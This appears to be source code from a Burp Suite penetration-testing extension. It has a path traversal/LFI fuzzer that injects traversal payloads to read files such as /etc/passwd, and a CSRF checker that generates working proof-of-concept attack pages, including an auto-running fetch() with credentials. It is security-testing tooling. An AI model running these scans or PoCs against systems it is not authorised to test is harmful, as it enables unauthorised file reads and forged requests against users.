class PathTraversalPanel(BaseToolPanel):
    def __init__(self, callbacks=None, helpers=None):
        super(PathTraversalPanel, self).__init__("Path Traversal / LFI", callbacks, helpers)

    def _add_extra_options(self):
        self._extra_panel.add(JLabel("File param:"))
        self._param_field = JTextField(10)
        self._extra_panel.add(self._param_field)
        self._extra_panel.add(JLabel("Wordlist (seqs):"))
        self._wl_field = JTextField(20)
        self._wl_field.setToolTipText("Path to a wordlist of traversal sequences, one per line")
        self._extra_panel.add(self._wl_field)
        panel_pt = self
        from javax.swing import JFileChooser as _JFC_PT
        from java.awt.event import ActionListener as _AL_PT
        class _WlBrowseL(_AL_PT):
            def actionPerformed(self, e):
                fc = _JFC_PT()
                if fc.showOpenDialog(panel_pt) == _JFC_PT.APPROVE_OPTION:
                    panel_pt._wl_field.setText(fc.getSelectedFile().getAbsolutePath())
        btn_wl = JButton("Browse")
        btn_wl.addActionListener(_WlBrowseL())
        self._extra_panel.add(btn_wl)
        self._extra_panel.add(JLabel("Target file:"))
        self._fname_field = JTextField(14)
        self._fname_field.setToolTipText(
            "Filename to append to every traversal payload (e.g. flag.txt, secret.txt). "
            "Leave blank to use built-in /etc/passwd + win.ini signatures.")
        self._extra_panel.add(self._fname_field)
        self._extra_panel.add(JLabel("Delay (ms):"))
        self._delay_field = JTextField("0", 5)
        self._delay_field.setToolTipText("Milliseconds to wait between requests (0 = no delay)")
        self._extra_panel.add(self._delay_field)

    def _run_check(self, url, auth_hdrs, out, sf):
        import time as _pt_time
        try:
            _pt_delay = max(0.0, float(self._delay_field.getText().strip() or "0")) / 1000.0
        except Exception:
            _pt_delay = 0.0

        # Target filename to append to every traversal payload (optional)
        _pt_fname = self._fname_field.getText().strip()

        pairs, is_post = self._get_fuzz_pairs(url)
        param_override = self._param_field.getText().strip()
        keywords = ("file", "path", "page", "include", "load", "document",
                    "template", "view", "filename", "src", "resource")
        if param_override:
            test_params = [param_override]
        elif pairs:
            test_params = [k for k, v in pairs if any(kw in k.lower() for kw in keywords)] or [k for k, v in pairs]
        else:
            _append(out, "[!] No parameters found. Add ?file=test, specify a param name, or import a POST request.")
            return

        if is_post:
            _append(out, "[*] POST body mode - injecting LFI payloads into request body")

        # Custom wordlist overrides built-in; default uses _LFI_WORDLIST (direct payloads)
        wl_path_pt = self._wl_field.getText().strip()
        if wl_path_pt:
            custom_wl = _read_wordlist(wl_path_pt)
            if custom_wl:
                lfi_payloads = custom_wl
                _append(out, "[*] Using custom wordlist: {} payloads from {}".format(
                    len(lfi_payloads), wl_path_pt))
            else:
                _append(out, "[!] Wordlist empty or unreadable: {}".format(wl_path_pt))
                lfi_payloads = _LFI_WORDLIST
        else:
            lfi_payloads = _LFI_WORDLIST

        if _pt_fname:
            _append(out, "[*] Target file: {!r} (appended to every payload)".format(_pt_fname))

        base = url.split("?")[0]
        _append(out, "[*] Testing {} param(s) with {} payloads...".format(
            len(test_params), len(lfi_payloads)))
        found = False
        def _pt_repeater(new_pairs):
            """Build (url, method, body) carrying the traversal payload for Send-to-Repeater."""
            if is_post:
                return base, "POST", "&".join("{}={}".format(k, v) for k, v in new_pairs)
            return base + "?" + "&".join("{}={}".format(k, v) for k, v in new_pairs), "GET", None

        for param in test_params:
            if sf[0] or found: break
            _append(out, "  Parameter: {}".format(param))
            # Benign-value baseline for this param so a custom-file "hit" is judged by a real
            # DIFFERENCE, not just "HTTP 200 with a body" (which fired on every normal page).
            _pt_bl = (None, 0)
            try:
                _blp = [(k, ("vaptbenign123" if k == param else v)) for k, v in pairs]
                if not any(k == param for k, v in pairs):
                    _blp.append((param, "vaptbenign123"))
                _bs, _bh, _bb = self._fuzz_send(base, _blp, auth_hdrs, timeout_ms=10000)
                _pt_bl = (_bs, len(_bb or ""))
            except (Exception, JavaException):
                pass
            for raw_payload in lfi_payloads:
                if sf[0] or found: break
                if _pt_delay > 0:
                    _pt_time.sleep(_pt_delay)

                # Append target filename when specified
                if _pt_fname:
                    sep = "/" if not (raw_payload.endswith("/") or raw_payload.endswith("\\")) else ""
                    payload = raw_payload + sep + _pt_fname
                else:
                    payload = raw_payload

                new_pairs = []
                for k, v in pairs:
                    if k == param:
                        new_pairs.append((k, payload))
                    else:
                        new_pairs.append((k, v))
                if not any(k == param for k, v in pairs):
                    new_pairs.append((param, payload))
                try:
                    s, h, b = self._fuzz_send(base, new_pairs, auth_hdrs, timeout_ms=10000)
                    _bl = (b or "").lower()
                    # Known file-content signatures (case-insensitive) -- reliable confirmation.
                    hit_sig = None
                    for target, sig in _PT_TARGETS:
                        if sig.lower() in _bl:
                            hit_sig = sig
                            break
                    # PHP base64 filter wrapper: decode and re-check for file signatures.
                    if not hit_sig and "convert.base64-encode" in payload:
                        try:
                            import re as _ptre, base64 as _ptb64
                            _m = _ptre.search(r'([A-Za-z0-9+/]{40,}={0,2})', b or "")
                            if _m:
                                _dec = _ptb64.b64decode(_m.group(1)).lower()
                                for target, sig in _PT_TARGETS:
                                    if sig.lower() in _dec:
                                        hit_sig = sig + " (base64-decoded)"
                                        break
                        except Exception:
                            pass
                    _ru, _rm, _rb = _pt_repeater(new_pairs)
                    if hit_sig:
                        _append(out, "  [VULN] {!r} -> HTTP {} sig={!r}".format(payload[:80], s, hit_sig))
                        self._log_vuln("PathTraversal CONFIRMED param={!r} payload={!r} sig={!r}".format(
                            param, payload[:60], hit_sig[:20]), _ru, method=_rm, headers=auth_hdrs, body=_rb)
                        found = True
                    elif _pt_fname:
                        # Custom target file with no built-in signature: only a CANDIDATE when the
                        # response materially DIFFERS from the benign-value baseline (kills the old
                        # "any 200>30 bytes = vuln" false positive). Does NOT abort the scan.
                        _diff = (_pt_bl[0] is not None and (s != _pt_bl[0]
                                 or abs(len(b or "") - _pt_bl[1]) > max(60, int(_pt_bl[1] * 0.25) + 1)))
                        if s == 200 and _diff:
                            snippet = (b or "")[:200].replace("\r", "").replace("\n", " ")
                            _append(out, "  [CHECK] {!r} -> HTTP 200 ({}b vs baseline {}b) -- DIFFERS, verify "
                                         "it's the file content.".format(payload[:70], len(b or ""), _pt_bl[1]))
                            _append(out, "          Preview: {}".format(snippet[:120]))
                            self._log_vuln("PathTraversal candidate param={!r} payload={!r}".format(
                                param, payload[:60]), _ru, method=_rm, headers=auth_hdrs, body=_rb)
                        else:
                            _append(out, "  [-]   {!r} -> HTTP {} ({}b ~ baseline {}b)".format(
                                payload[:70], s, len(b or ""), _pt_bl[1]))
                    else:
                        _append(out, "  [-]   {!r} -> HTTP {} no sig".format(payload[:80], s))
                except (RuntimeError, Exception, JavaException) as _pt_e:
                    _append(out, "  [!]   {!r} -> error: {}".format(
                        payload[:60], str(_pt_e)[:80]))

        _append(out, "")
        if found:
            if _pt_fname:
                _append(out, "[!] Potential file read confirmed for {!r}!".format(_pt_fname))
            else:
                _append(out, "[!] Path traversal/LFI confirmed!")
        else:
            _append(out, "[+] No traversal confirmed. Try manual testing with Burp Intruder.")


# ===========================================================================
# Tool 19 - CSRF Testing
# ===========================================================================
import re as _re_csrf
_CSRF_TOKEN_RE = _re_csrf.compile(
    r'name=["\']([^"\']*(?:csrf|token|nonce|_token|authenticity_token'
    r'|__requestverificationtoken|antiforgery|xsrf)[^"\']*)["\']\s*(?:[^>]*value=["\']([^"\']*)["\'])?',
    _re_csrf.IGNORECASE | _re_csrf.DOTALL)


class CsrfPanel(BaseToolPanel):
    def __init__(self, callbacks=None, helpers=None):
        self._last_poc_html = [None]
        super(CsrfPanel, self).__init__("CSRF Testing", callbacks, helpers)

    def _add_extra_buttons(self, btn_panel):
        super(CsrfPanel, self)._add_extra_buttons(btn_panel)
        self._btn_open_poc = JButton("Open PoC in Browser")
        self._btn_open_poc.setEnabled(False)
        self._btn_open_poc.setToolTipText(
            "Save the generated CSRF PoC to a temp file and open it in your default browser")
        btn_panel.add(self._btn_open_poc)
        panel = self
        from java.awt.event import ActionListener as _AL_CSRF
        class _OpenPocL(_AL_CSRF):
            def actionPerformed(self, e):
                panel._open_poc_in_browser()
        self._btn_open_poc.addActionListener(_OpenPocL())

    def _open_poc_in_browser(self):
        html = self._last_poc_html[0]
        if not html:
            JOptionPane.showMessageDialog(self,
                "No PoC HTML generated yet -- run a scan first.",
                "Open PoC in Browser", JOptionPane.INFORMATION_MESSAGE)
            return
        try:
            import java.io as _jio_poc
            tmp = _jio_poc.File.createTempFile("csrf_poc_", ".html")
            tmp.deleteOnExit()
            pw = _jio_poc.PrintWriter(_jio_poc.FileWriter(tmp))
            pw.print(html)
            pw.close()
            import java.awt as _awt_poc
            _awt_poc.Desktop.getDesktop().browse(tmp.toURI())
            _append(self._output, "[*] PoC opened in browser: {}".format(
                tmp.getAbsolutePath()))
        except (Exception, JavaException) as _poc_e:
            JOptionPane.showMessageDialog(self,
                "Could not open browser: {}".format(str(_poc_e)),
                "Open PoC in Browser", JOptionPane.ERROR_MESSAGE)

    def _run_check(self, url, auth_hdrs, out, sf):
        _append(out, "[*] Fetching target page...")
        try:
            s, h, b = _http(url, req_headers=auth_hdrs, timeout_ms=12000,
                             follow_redirects=True)
            _append(out, "    HTTP {} | {} bytes".format(s, len(b)))
        except (RuntimeError, Exception, JavaException) as e:
            _append(out, "[!] Request failed: {}".format(e)); return

        # Token detection
        _append(out, "")
        tokens = _CSRF_TOKEN_RE.findall(b)
        if tokens:
            _append(out, "  [OK]   {} CSRF token candidate(s) in HTML:".format(len(tokens)))
            for name, value in tokens:
                _append(out, "         name={!r}  value={}".format(
                    name, repr(value) if value else "(empty/missing)"))
        else:
            _append(out, "  [VULN] No CSRF token found in form inputs")

        # SameSite cookie check from Set-Cookie headers
        for hk, hv in h.items():
            if hk.lower() == "set-cookie":
                cookie_lower = hv.lower()
                name = hv.split("=")[0].strip()
                if "samesite" not in cookie_lower:
                    _append(out, "  [WARN] Cookie {!r}: SameSite not set".format(name))
                elif "samesite=none" in cookie_lower:
                    _append(out, "  [WARN] Cookie {!r}: SameSite=None - cross-site allowed".format(name))
                elif "samesite=lax" in cookie_lower:
                    _append(out, "  [INFO] Cookie {!r}: SameSite=Lax - GET state mutations possible".format(name))
                else:
                    _append(out, "  [OK]   Cookie {!r}: SameSite=Strict".format(name))

        # CORS ACAO check
        acao = h.get("access-control-allow-origin", "")
        if acao == "*":
            _append(out, "  [VULN] CORS: Access-Control-Allow-Origin: * - cross-origin reads allowed")
        elif acao:
            _append(out, "  [INFO] CORS: ACAO: {}".format(acao))

        # ---- Inline PoC HTML generator ------------------------------------
        _append(out, "")
        _append(out, "[*] Generating CSRF PoC HTML...")
        try:
            # Determine form action
            poc_action = url
            form_m = re.search(
                r'<form[^>]+action=["\']([^"\']*)["\']', b, re.IGNORECASE)
            if form_m:
                action_raw = form_m.group(1)
                if action_raw.startswith("http"):
                    poc_action = action_raw
                elif action_raw.startswith("/"):
                    from java.net import URL as _URLP
                    _pp = _URLP(url)
                    poc_action = "{}://{}{}{}".format(
                        _pp.getProtocol(), _pp.getHost(),
                        "" if _pp.getPort() == -1 else ":{}".format(_pp.getPort()),
                        action_raw)
                else:
                    poc_action = url.rstrip("/") + "/" + action_raw

            # Determine method
            method_m = re.search(r'<form[^>]+method=["\'](\w+)["\']', b, re.IGNORECASE)
            form_method = (method_m.group(1).upper() if method_m else "POST")

            # Extract all named input/textarea/select fields
            input_fields = re.findall(
                r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?',
                b, re.IGNORECASE | re.DOTALL)
            select_fields = re.findall(
                r'<select[^>]+name=["\']([^"\']+)["\']', b, re.IGNORECASE)
            textarea_fields = re.findall(
                r'<textarea[^>]+name=["\']([^"\']+)["\']', b, re.IGNORECASE)

            hidden_inputs = []
            for name, value in input_fields:
                hidden_inputs.append(
                    '  <input type="hidden" name="{}" value="{}">'.format(
                        name.replace('"', '&quot;'), value.replace('"', '&quot;')))
            for name in select_fields:
                hidden_inputs.append(
                    '  <input type="hidden" name="{}" value="CSRF_VALUE">'.format(
                        name.replace('"', '&quot;')))
            for name in textarea_fields:
                hidden_inputs.append(
                    '  <input type="hidden" name="{}" value="CSRF_VALUE">'.format(
                        name.replace('"', '&quot;')))

            fields_html = "\n".join(hidden_inputs) if hidden_inputs else \
                '  <!-- No form fields found; add manually -->'

            _imp_ct   = (self._imported_ct or "").lower()
            _imp_body = (self._imported_body or "").strip()
            _is_json  = ("application/json" in _imp_ct or
                         _imp_body.startswith(("{", "[")))
            if _is_json:
                _json_body = _imp_body if _imp_body else "{}"
                poc_html = (
                    "<!DOCTYPE html>\n"
                    "<html>\n"
                    "<head><title>CSRF PoC (JSON) - VAPT Toolkit</title></head>\n"
                    "<body onload=\"attack()\">\n"
                    "<h2 style=\"color:red\">CSRF Proof of Concept (JSON fetch)</h2>\n"
                    "<p>Target: <code>{target}</code></p>\n"
                    "<p style=\"color:orange\">JSON endpoint — uses fetch() with credentials.</p>\n"
                    "<script>\n"
                    "function attack() {{\n"
                    "  fetch('{action}', {{\n"
                    "    method: '{method}',\n"
                    "    credentials: 'include',\n"
                    "    headers: {{'Content-Type': 'application/json'}},\n"
                    "    body: JSON.stringify({body_json})\n"
                    "  }}).then(r => document.body.innerHTML += '<p>Status: ' + r.status + '</p>');\n"
                    "}}\n"
                    "</script>\n"
                    "</body>\n"
                    "</html>"
                ).format(target=url, action=poc_action,
                         method=form_method, body_json=_json_body)
            else:
                poc_html = (
                    "<!DOCTYPE html>\n"
                    "<html>\n"
                    "<head><title>CSRF PoC - VAPT Toolkit</title></head>\n"
                    "<body>\n"
                    "<h2 style=\"color:red\">CSRF Proof of Concept</h2>\n"
                    "<p>Target: <code>{target}</code></p>\n"
                    "<form id=\"csrf-poc\" method=\"{method}\" action=\"{action}\">\n"
                    "{fields}\n"
                    "  <input type=\"submit\" value=\"Click to trigger CSRF\">\n"
                    "</form>\n"
                    "</body>\n"
                    "</html>"
                ).format(target=url, method=form_method,
                         action=poc_action, fields=fields_html)

            self._last_poc_html[0] = poc_html
            _ui(lambda: self._btn_open_poc.setEnabled(True))

            _append(out, "")
            _append(out, "----- CSRF PoC HTML (save as .html and open in browser) -----")
            for line in poc_html.split("\n"):
                _append(out, line)
            _append(out, "----- End PoC -----")
        except Exception as poc_e:
            _append(out, "  [!] PoC generation error: {}".format(poc_e))

        _append(out, "")
        _append(out, "[+] CSRF analysis complete.")


